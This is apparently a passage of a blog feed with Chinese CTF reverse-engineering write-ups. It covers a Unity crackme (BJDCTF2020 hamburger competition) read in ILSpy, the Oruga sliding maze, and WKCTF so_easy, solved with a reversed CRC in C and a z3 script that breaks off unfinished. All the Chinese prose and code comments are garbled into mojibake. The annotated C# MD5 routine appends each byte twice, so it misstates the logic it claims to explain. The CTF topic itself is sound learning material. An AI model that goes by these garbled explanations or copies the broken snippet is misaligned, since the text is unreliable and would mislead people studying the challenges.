class="line"><span class="comment"># start: åˆ‡ç‰‡çš„èµ·å§‹ç´¢å¼•ï¼ˆåŒ…å«è¯¥ä½ç½®ï¼‰ã€‚å¦‚æœçœç•¥ï¼Œé»˜è®¤ä¸º 0ã€‚</span></span><br><span class="line"><span class="comment"># end: åˆ‡ç‰‡çš„ç»“æŸç´¢å¼•ï¼ˆä¸åŒ…å«è¯¥ä½ç½®ï¼‰ã€‚å¦‚æœçœç•¥ï¼Œé»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è·å–è¢«åŠ å¯†å­—ç¬¦ä¸²çš„ä¸€ä¸ªå—ï¼Œæ¯å— 8 ä¸ªå­—ç¬¦</span></span><br><span class="line">    p = enc[<span class="number">8</span>*i:(i+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># b2a_hex æ˜¯ binascii æ¨¡å—ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†å­—èŠ‚ä¸²ï¼ˆbytes ç±»å‹ï¼‰è½¬æ¢ä¸ºåå…­è¿›åˆ¶è¡¨ç¤ºçš„ ASCII å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line">    <span class="comment"># binascii.b2a_hex(data, sep=b&#x27;&#x27;)</span></span><br><span class="line">    <span class="comment"># data: éœ€è¦è½¬æ¢çš„å­—èŠ‚ä¸²ï¼ˆbytes ç±»å‹ï¼‰ã€‚</span></span><br><span class="line">    <span class="comment"># sep: åˆ†éš”ç¬¦ï¼Œé»˜è®¤ä¸ºç©ºå­—èŠ‚ä¸²ï¼ˆb&#x27;&#x27;ï¼‰ï¼Œå¯ä»¥æŒ‡å®šåˆ†éš”ç¬¦ï¼ˆä¾‹å¦‚ç©ºæ ¼ï¼‰ã€‚</span></span><br><span class="line">    <span class="comment"># [::-1] åœ¨æ‹¬å·é‡Œæ˜¯ç”¨æ¥å¯¹ p.encode(&#x27;ascii&#x27;) çš„ç»“æœè¿›è¡Œåè½¬ã€‚</span></span><br><span class="line">    <span class="comment"># è¿™æ ·åšæ˜¯ä¸ºäº†å…ˆå°†å­—ç¬¦ä¸² p ç¼–ç æˆå­—èŠ‚ï¼Œå†å°†è¿™äº›å­—èŠ‚åè½¬ã€‚</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å°†å—é€†åºç¼–ç ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">    a = binascii.b2a_hex(p.encode(<span class="string">&#x27;ascii&#x27;</span>)[::-<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># a2b_hex æ˜¯ binascii æ¨¡å—ä¸­çš„å¦ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†åå…­è¿›åˆ¶è¡¨ç¤ºçš„ ASCII å­—ç¬¦ä¸²è½¬æ¢å›å­—èŠ‚ä¸²ï¼ˆbytes ç±»å‹ï¼‰ã€‚</span></span><br><span class="line">    <span class="comment"># binascii.a2b_hex(data)</span></span><br><span class="line">    <span class="comment"># data: éœ€è¦è½¬æ¢çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼ˆbytes ç±»å‹ï¼‰ã€‚å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸¤ä¸ªå­—ç¬¦è¡¨ç¤ºä¸€ä¸ªå­—èŠ‚ã€‚</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬å›æ•´æ•°ï¼Œè¿›è¡ŒåŠ å¯†æ•°æ®åŠ æ³•ï¼Œæœ€åè½¬æ¢å›å­—èŠ‚</span></span><br><span class="line">    b = binascii.a2b_hex(<span class="built_in">hex</span>(<span class="built_in">int</span>(a,<span class="number">16</span>)+key[i])[<span class="number">2</span>:])[::-<span class="number">1</span>]</span><br><span class="line">    flag += b</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><hr><p>è¿˜æœ‰ä¸ªæ¯”è¾ƒå®¹æ˜“ç†è§£çš„è„šæœ¬</p><p>ã€ç‚¹å‡»è¿™é‡Œã€‘<a href="https://blog.csdn.net/qq_64558075/article/details/121926861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172135997916800211590777%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=172135997916800211590777&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-18-121926861-null-null.142">https://blog.csdn.net/qq_64558075/article/details/121926861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172135997916800211590777%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=172135997916800211590777&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-18-121926861-null-null.142</a></p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€unityé€†å‘ã€‘ã€buuã€‘[BJDCTF2020]BJD hamburger competition</title>
      <link href="/2024/07/19/%E3%80%90unity%E9%80%86%E5%90%91%E3%80%91%E3%80%90buu%E3%80%91%5BBJDCTF2020%5DBJD%20hamburger%20competition/"/>
      <url>/2024/07/19/%E3%80%90unity%E9%80%86%E5%90%91%E3%80%91%E3%80%90buu%E3%80%91%5BBJDCTF2020%5DBJD%20hamburger%20competition/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€unityé€†å‘ã€‘ã€buuã€‘-BJDCTF2020-BJD-hamburger-competition"><a href="#ã€unityé€†å‘ã€‘ã€buuã€‘-BJDCTF2020-BJD-hamburger-competition" class="headerlink" title="ã€unityé€†å‘ã€‘ã€buuã€‘[BJDCTF2020]BJD hamburger competition"></a>ã€unityé€†å‘ã€‘ã€buuã€‘[BJDCTF2020]BJD hamburger competition</h1><p>å¥½ä¹…æ²¡åšunityé€†å‘æœ‰ç‚¹å¿˜äº†</p><hr><p>å…ˆè¯´å·¥å…·ï¼Œä½¿ç”¨ILSpyï¼Œè¿™ä¸ªæ˜¯githubå¼€æºé¡¹ç›®ï¼Œ</p><p>ä¸‹è½½ä¸é£Ÿç”¨æ–¹æ³•ï¼š</p><p><a href="https://blog.csdn.net/lilongsy/article/details/130179189?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172135563016800227423365%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172135563016800227423365&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-130179189-null-null.142">https://blog.csdn.net/lilongsy/article/details/130179189?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172135563016800227423365%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172135563016800227423365&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-130179189-null-null.142</a></p><p><a href="https://blog.csdn.net/weixin_44785150/article/details/130591983?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172135563016800227423365%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172135563016800227423365&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-130591983-null-null.142">https://blog.csdn.net/weixin_44785150/article/details/130591983?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172135563016800227423365%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172135563016800227423365&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-130591983-null-null.142</a></p><hr><h2 id="BJDCTF2020-BJD-hamburger-competition"><a href="#BJDCTF2020-BJD-hamburger-competition" class="headerlink" title="[BJDCTF2020]BJD hamburger competition"></a>[BJDCTF2020]BJD hamburger competition</h2><p>ç„¶åå°†**~~~~\BJD hamburger competition_Data\Managed\Assembly-CSharp.dll**ç”¨ILSpyæ‰“å¼€</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BBJDCTF2020%5DBJD%20hamburger%20competition/ILPsy.png" alt="ILPsy"></p><p>ï¼ˆ<strong>ä»€ä¹ˆä½ è¯´ä¸ä¸€æ ·ï¼Œå±•ä¸å¼€ï¼Ÿâ•æ˜¯å¹²ä»€ä¹ˆç”¨çš„å…„å¼Ÿ</strong>ï¼‰</p><p>å‘ç°æœ‰ä¸ªSHA1å­—ç¬¦ä¸²ï¼Œå¦‚æœstrç»è¿‡SHA1åŠ å¯†åæ˜¯è¿™ä¸ªå­—ç¬¦ä¸²å°±å¯¹strè¿›è¡ŒMd5åŠ å¯†ï¼Œ</p><p>æ‰¾ä¸ªåœ¨çº¿ç½‘ç«™åŠ å¯†å»äº†ï¼Œäº¤åå‘ç°æ˜¯é”™çš„ï¼Œè·Ÿè¿›Md5çœ‹ä¸€ä¸‹</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BBJDCTF2020%5DBJD%20hamburger%20competition/Md5.png" alt="Md5"></p><p>ç”±äºæœ¬äººæ²¡ä»€ä¹ˆC#åŸºç¡€ï¼Œæ¥ä¸‹æ¥å¯¹å…³é”®éƒ¨åˆ†è¿›è¡Œè§£é‡Š</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">HashUtil</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">Md5</span>(<span class="params"><span class="built_in">string</span> str</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// å°†è¾“å…¥å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ï¼Œä½¿ç”¨ UTF-8 ç¼–ç </span></span><br><span class="line">        <span class="built_in">byte</span>[] bytes = Encoding.UTF8.GetBytes(str);</span><br><span class="line">        <span class="comment">// åˆ›å»º MD5 å“ˆå¸Œç®—æ³•çš„å®ä¾‹ï¼Œå¹¶è®¡ç®—å­—èŠ‚æ•°ç»„çš„ MD5 å“ˆå¸Œå€¼</span></span><br><span class="line">    <span class="built_in">byte</span>[] hashBytes = MD5.Create().ComputeHash(bytes);</span><br><span class="line">        <span class="comment">// åˆå§‹åŒ–ä¸€ä¸ª StringBuilderï¼Œç”¨äºæ„å»ºå“ˆå¸Œå€¼çš„åå…­è¿›åˆ¶è¡¨ç¤º</span></span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        </span><br><span class="line"><span class="comment">// éå†å“ˆå¸Œå­—èŠ‚æ•°ç»„</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="built_in">byte</span> b <span class="keyword">in</span> hashBytes)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// å°†æ¯ä¸ªå­—èŠ‚è½¬æ¢ä¸ºä¸¤ä½çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶è¿½åŠ åˆ°StringBuilder</span></span><br><span class="line">            stringBuilder.Append(b.ToString(<span class="string">&quot;X2&quot;</span>));</span><br><span class="line">           <span class="comment">// &quot;X2&quot; æ ¼å¼è¯´æ˜ç¬¦è¡¨ç¤ºä½¿ç”¨å¤§å†™å­—æ¯ï¼Œå¹¶ä¸”æ¯ä¸ªå­—èŠ‚ç”¨ä¸¤ä½æ•°è¡¨ç¤º</span></span><br><span class="line">            stringBuilder.Append(b.ToString(<span class="string">&quot;X2&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"><span class="comment">// ä» StringBuilder ä¸­è·å–å®Œæ•´çš„åå…­è¿›åˆ¶å“ˆå¸Œå­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="built_in">string</span> fullHashString = stringBuilder.ToString();</span><br><span class="line">        </span><br><span class="line"><span class="comment">// è¿”å›å“ˆå¸Œå­—ç¬¦ä¸²çš„å‰ 20 ä¸ªå­—ç¬¦</span></span><br><span class="line">        <span class="keyword">return</span> fullHashString.Substring(<span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">       <span class="comment">// Substring(0, 20) æå–ä»ç´¢å¼• 0 å¼€å§‹çš„å‰ 20 ä¸ªå­—ç¬¦</span></span><br><span class="line">       <span class="comment">//ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä»ç¬¬å‡ ä½å¼€å§‹ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å‰å¤šå°‘ä¸ªå­—ç¬¦</span></span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸²ä»£ç æ˜¯è¾“å‡ºMD5çš„å‰20ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”å…¨ç”¨å¤§å†™å­—æ¯è¡¨ç¤ºï¼Œ</p><p>è€Œæ­£å¸¸çš„MD5æœ‰32ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æˆªå–å‰20ä¸ªå­—ç¬¦ç„¶åè½¬æ¢æˆå¤§å†™å°±å¯ä»¥å¾—å‡ºFLAG</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€BUUã€‘Oruga å†…å¿ƒosï¼šæˆ‘è§‰å¾—åº”è¯¥å«æ»‘å†°ï¼ˆ</title>
      <link href="/2024/07/18/%E3%80%90BUU%E3%80%91Oruga/"/>
      <url>/2024/07/18/%E3%80%90BUU%E3%80%91Oruga/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€BUUã€‘Oruga"><a href="#ã€BUUã€‘Oruga" class="headerlink" title="ã€BUUã€‘Oruga"></a>ã€BUUã€‘Oruga</h1><h2 id="å†…å¿ƒ-osï¼šæˆ‘è§‰å¾—åº”è¯¥å«æ»‘å†°ï¼ˆ"><a href="#å†…å¿ƒ-osï¼šæˆ‘è§‰å¾—åº”è¯¥å«æ»‘å†°ï¼ˆ" class="headerlink" title="å†…å¿ƒ osï¼šæˆ‘è§‰å¾—åº”è¯¥å«æ»‘å†°ï¼ˆ"></a>å†…å¿ƒ osï¼šæˆ‘è§‰å¾—åº”è¯¥å«æ»‘å†°ï¼ˆ</h2><p>æ‹–è¿› ida çœ‹ hex ä¸‹é¢æœ‰ä¸ªåœ°æ–¹åƒæ˜¯åœ°å›¾</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/Oruga/map.png" alt="map"></p><p>main å‡½æ•°è¿›å…¥åæœ‰ä¸ªç–‘ä¼¼æ˜¯ä¸Šä¸‹å·¦å³çš„éƒ¨åˆ†</p><p>Wï¼šä¸Š Eï¼šå³ Jï¼šå·¦ M ä¸‹</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/Oruga/%E4%B8%8A%E4%B8%8B%E5%B7%A6%E5%8F%B3.png" alt="ä¸Šä¸‹å·¦å³"></p><p>æŠŠåœ°å›¾æ¢æˆä¸€ç§æ›´æ˜ç¡®çš„æ–¹å¼</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/Oruga/MZAE.png" alt="MZAE"></p><p>è¿˜æ˜¯è§‰å¾—åŒªå¤·æ‰€æ€ï¼Œæ‰¾äº†ä¸ª wp çœ‹äº†ä¸€ä¸‹ï¼Œ</p><p>å‘ç°æ˜¯å®å¯æ¢¦å†°é¢è§£å¯†çš„é‚£ç§è¿·å®«ï¼Œé‡åˆ°éšœç¢ç‰©ä¹‹å‰æ˜¯ä¸ä¼šåœä¸‹çš„</p><p>æ‰€è¾“å…¥çš„å°±æ˜¯ flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€WKCTFã€‘so_easy</title>
      <link href="/2024/07/17/%E3%80%90WKCTF%E3%80%91so_easy/"/>
      <url>/2024/07/17/%E3%80%90WKCTF%E3%80%91so_easy/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€WKCTFã€‘so-easy"><a href="#ã€WKCTFã€‘so-easy" class="headerlink" title="ã€WKCTFã€‘so_easy"></a><strong>ã€WKCTFã€‘</strong>so_easy</h1><p>ç”¨å‹ç¼©åŒ…æ‰“å¼€apkï¼ŒæŠŠé‡Œé¢çš„x86_64çš„ .soæ–‡ä»¶è§£å‹å‡ºæ¥æ‹–å…¥ida</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/wkctf/so-easy/so_main.png.png" alt="so_main.png"></p><p>æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯z3çˆ†ç ´ï¼Œä¸€ä¸ªæ˜¯æ ¹æ®è¿™ä¸ªé­”æ”¹CRCè¿›è¡Œé€†å‘</p><h2 id="CRCæ ¡éªŒ"><a href="#CRCæ ¡éªŒ" class="headerlink" title="CRCæ ¡éªŒ"></a>CRCæ ¡éªŒ</h2><p>å…ˆè¯´æ­£ç‰ˆåšæ³•CRCé€†å‘</p><hr><p>ã€[CRCæ ¡éªŒ]æ‰‹ç®—ä¸ç›´è§‚æ¼”ç¤ºã€‘ <a href="https://www.bilibili.com/video/BV1V4411Z7VA/?share_source=copy_web&vd_source=86d6e63e560e68bb720088caa831e036">https://www.bilibili.com/video/BV1V4411Z7VA/?share_source=copy_web&amp;vd_source=86d6e63e560e68bb720088caa831e036</a></p><p>ã€CRCåŸç†ã€‘<a href="https://bbs.21ic.com/icview-2403118-1-2.html?_dsign=e20cd6df">https://bbs.21ic.com/icview-2403118-1-2.html?_dsign=e20cd6df</a></p><p>ã€ä¸Šé¢ CRCåŸç† çœ‹ä¸æ‡‚å…ˆçœ‹è¿™ä¸ªã€‘<a href="https://blog.csdn.net/eydwyz/article/details/105705831?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172121223216800182199332%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=172121223216800182199332&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-20-105705831-null-null.142">https://blog.csdn.net/eydwyz/article/details/105705831?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172121223216800182199332%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=172121223216800182199332&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-20-105705831-null-null.142</a></p><hr><p>æ‰¾ä¸€ä¸ªè„šæœ¬CRC32çš„è„šæœ¬ï¼ŒæŠŠç›¸åº”çš„æ•°æ®ä¿®æ”¹è¿‡æ¥</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> s[] = &#123;<span class="number">-82</span>, <span class="number">-127</span>, <span class="number">-70</span>, <span class="number">-63</span>, <span class="number">-16</span>, <span class="number">-107</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">20</span>, <span class="number">3</span>,</span><br><span class="line"><span class="number">74</span>, <span class="number">-30</span>, <span class="number">82</span>, <span class="number">78</span>, <span class="number">-124</span>, <span class="number">-8</span>, <span class="number">-55</span>, <span class="number">62</span>, <span class="number">20</span>, <span class="number">-104</span>, <span class="number">-113</span>, <span class="number">-104</span>, <span class="number">-3</span>, <span class="number">9</span>, <span class="number">94</span>, <span class="number">-83</span>, <span class="number">5</span>,</span><br><span class="line"><span class="number">-76</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">-64</span>, <span class="number">63</span>&#125;;</span><br><span class="line">__int64 *ans = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">255</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">ans = (__int64 *)(s+i);</span><br><span class="line"><span class="keyword">if</span>(*ans &amp; <span class="number">1</span>)<span class="comment">//åˆ¤æ–­æ˜¯å¦ä¸ºå¥‡æ•° ï¼Œå› ä¸ºCRCåŠ å¯†åçš„æœ«ä½å°±æ˜¯1ï¼Œæ‰€ä»¥è¿™é‡Œå¼‚æˆ–æ²¡é—®é¢˜</span></span><br><span class="line">  &#123;</span><br><span class="line"><span class="keyword">if</span>(*ans &lt; <span class="number">0</span>)<span class="comment">//å¥‡æ•°å°äº0çš„æƒ…å†µ</span></span><br><span class="line">&#123;</span><br><span class="line">*ans ^= <span class="number">0x71234EA7D92996F5</span>;</span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//å¥‡æ•°å¤§äº0çš„æƒ…å†µï¼Œéœ€è¦è¿›è¡Œå°†è¡¥å¿æ€§å¼‚æˆ–ï¼Œä¿è¯ä¸ºè´Ÿæ•°ï¼ˆä¸çŸ¥é“ä¸ºå•¥ï¼‰</span></span><br><span class="line">&#123;</span><br><span class="line">*ans ^= <span class="number">0x71234EA7D92996F5</span>;</span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">*ans ^= <span class="number">0x8000000000000000</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//ä¸æ˜¯å¥‡æ•°çš„æƒ…å†µï¼Œå› ä¸ºCRCå¼‚æˆ–å®Œåº”ä¸ºå¥‡æ•°ï¼Œæ‰€ä»¥å¶æ•°ç›´æ¥è¿›è¡Œå³ç§»æ“ä½œ</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(*ans &lt; <span class="number">0</span>)<span class="comment">//å¶æ•°å°äº0çš„æƒ…å†µï¼Œéœ€è¦è¿›è¡Œå°†è¡¥å¿æ€§å¼‚æˆ–ï¼Œä¿è¯ä¸ºè´Ÿæ•°ï¼ˆä¸çŸ¥é“ä¸ºå•¥ï¼‰</span></span><br><span class="line">&#123;</span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">*ans ^= <span class="number">0x8000000000000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//å¶æ•°å¤§äº0çš„æƒ…å†µ</span></span><br><span class="line">&#123;</span><br><span class="line">*ans /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, s[j]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Z3çˆ†ç ´"><a href="#Z3çˆ†ç ´" class="headerlink" title="Z3çˆ†ç ´"></a>Z3çˆ†ç ´</h2><p>ç„¶åå°±æ˜¯æ¯”è¾ƒæ— è„‘çš„çˆ†ç ´è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">final_flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0x540A95F0C1BA81AE</span>, <span class="number">0xF8844E52E24A0314</span>, <span class="number">0x09FD988F98143EC9</span>, <span 